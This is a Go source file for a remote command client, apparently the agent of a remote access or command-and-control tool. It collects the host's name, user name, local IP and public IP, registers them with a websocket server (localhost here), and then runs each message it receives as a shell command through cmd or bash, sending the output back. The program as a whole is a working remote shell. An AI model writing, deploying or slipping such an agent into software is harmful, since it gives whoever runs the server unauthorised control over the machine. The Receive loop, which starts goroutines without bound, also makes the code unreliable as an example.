package main

import (
	"bufio"
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"

	"github.com/coder/websocket"
)

type Execution struct {
	stdin  io.WriteCloser
	stdout io.ReadCloser
	stderr io.ReadCloser
}

// var id           int
var Commands     map[int]Execution
var PingError    error
var ReceiveError error

type Message struct {
    Sender   int    `json:"sender"`
    Receiver int    `json:"receiver"`
    Message  []byte `json:"message"`
    End      bool   `json:"end"`
}

func NewMessageFromJSON(bytes []byte) (Message, error) {
    var msg Message
    err := json.Unmarshal(bytes, &msg)
    if err != nil { return Message{}, err }

    return msg, nil
}

func NewMessageToJSON(sender, receiver int, message []byte, end bool) ([]byte, error) {
    msg := Message{
        Sender:   sender,
        Receiver: receiver,
        Message:  message,
        End:      end,
    }

    msg_bytes, err := json.Marshal(msg)
    if err != nil { return []byte{}, err }

    return msg_bytes, nil
}

type Client struct {
	Id           int
	SecretKey    string `json:"SecretKey"`
	ComputerName string `json:"ComputerName"`
	UserName     string `json:"UserName"`
	LocalIP      string `json:"LocalIP"`
	PublicIP     string `json:"PublicIP"`
	OS           string `json:"OS"`
	Conn         *websocket.Conn
}

func NewClient(secretKey, computerName, userName, localIP, publicIP, OS string) Client {
	if OS == "windows" {
		userName = strings.Split(userName, "\\")[1]
	}
	
	client := Client{
		SecretKey:    secretKey,
		ComputerName: computerName,
		UserName:     userName,
		LocalIP:      localIP,
		PublicIP:     publicIP,
		OS:           OS,
	}
	return client
}

func (client *Client) Start(websocket_URL string) error {
	conn, _, err := websocket.Dial(context.Background(), websocket_URL, nil)
	if err != nil { return err }
	defer conn.CloseNow()

	client.Conn = conn

	bytes, err := json.Marshal(client)
	if err != nil { return err }

	err = client.Write(client.Id, -1, bytes, true)
	if err != nil { return err }

	msg, err := client.Read()
	if err != nil { return err }
	client.Id = msg.Receiver

	go client.Ping()
	client.Receive()
	if ReceiveError != nil {
		return ReceiveError
	}

	conn.Close(websocket.StatusNormalClosure, "")
	return nil
}

func (client *Client) Ping() {
	var err error
	for {
		err = client.Conn.Ping(context.Background())
		if err != nil {
			PingError = err
			return
		}
	}
}

func Execute(command, os string) (*exec.Cmd, Execution, error) {
	var cmd *exec.Cmd
	if os == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("bash", "-c", command)
	}
	
	stdin,  err := cmd.StdinPipe()
	if err != nil { return cmd, Execution{}, err }

	stdout, err := cmd.StdoutPipe()
	if err != nil { return cmd, Execution{}, err }

	stderr, err := cmd.StderrPipe()
	if err != nil { return cmd, Execution{}, err }

	if err := cmd.Start(); err != nil { return cmd, Execution{}, err }

	return cmd, Execution{stdin, stdout, stderr}, nil

	// if err := cmd.Wait(); err != nil {
	// 	return stdout, err
	// }
}

func (client *Client) Receive() {
	for {
		go func() {
			if PingError != nil { return }

			msg, err := client.Read()
			if PingError != nil { return }
			if err != nil { log.Print(err, 12) }

			log.Print(msg, string(msg.Message))
	
			cmd, execution, err := Execute(string(msg.Message), client.OS)
			if err != nil { client.Write(client.Id, msg.Sender, []byte(err.Error()), true) }
			
			scanner := bufio.NewScanner(execution.stdout)
			for scanner.Scan() {
				err := client.Write(client.Id, msg.Sender, append([]byte("#!execution "), scanner.Bytes()...), false)
				if err != nil { log.Print(err, 123)}
	
				msg, err := client.Read()
				if err != nil { log.Print(err, 321) }
	
				if string(msg.Message) != "ok" { cmd.Cancel(); break }
			}
			err = client.Write(client.Id, msg.Sender, []byte("#!execution end"), true)
			if err != nil { log.Print(err, 123)}

			defer cmd.Wait()
		}()
	}
}

func (client *Client) Read() (Message, error) {
	_, bytes, err := client.Conn.Read(context.Background())
    if err != nil { log.Print(err, 3); return Message{}, err }
    
    msg, err := NewMessageFromJSON(bytes)
    if err != nil { log.Print(err, 14); return Message{}, err }

    return msg, nil
}

func(client *Client) Write(sender, receiver int, bytes []byte, end bool) error {
	msg_bytes, err := NewMessageToJSON(sender, receiver, bytes, end)
    if err != nil { log.Print(err, 4); return err }

    err = client.Conn.Write(context.Background(), websocket.MessageText, msg_bytes)
    if err != nil { log.Print(err, 10); return err }

	return nil
}

func getSecretKey(n int) (string, error) {
	hasher := sha256.New()
	b := make([]byte, n)
	_, err := rand.Read(b)
	if err != nil {
		return "", err
	}

	hasher.Write(b)
	sha := hex.EncodeToString(hasher.Sum(nil))

	return sha, nil
}

func getUserName() (string, error) {
	user, err := user.Current()
	if err != nil { return "", err }
	return user.Username, nil
}

func getComputerName() (string, error) {
	computerName, err := os.Hostname()
	if err != nil { return "", err }
	return computerName, nil
}

func getLocalIP() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil { return "", err }

	for _, iface := range interfaces {
		addrs, err := iface.Addrs()
		if err != nil { return "", err }

		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}

			if ipv4 := ip.To4(); ipv4 != nil && !ip.IsLoopback() { return ipv4.String(), nil }
		}
	}

	return "", fmt.Errorf("локальный IP адрес не найден")
}

func getPublicIP() (string, error) {
	resp, err := http.Get("https://api.ipify.org")
	if err != nil { return "", err }
	defer resp.Body.Close()

	ip, err := io.ReadAll(resp.Body)
	if err != nil { return "", err }

	return string(ip), nil
}

func main() {
	secretKey, err := getSecretKey(256)
	if err != nil { log.Fatal(err) }

	computerName, err := getComputerName()
	if err != nil { log.Fatal(err) }

	userName, err := getUserName()
	if err != nil { log.Print("Warning: ", err) }

	publicIP, err := getPublicIP()
	if err != nil { log.Fatal(err) }

	localIP, err := getLocalIP()
	if err != nil { log.Fatal(err) }

	client := NewClient(secretKey, computerName, userName, localIP, publicIP, runtime.GOOS)
	err = client.Start("ws://127.0.0.1:8080/ws/")
	if err != nil { log.Print(err) }
}
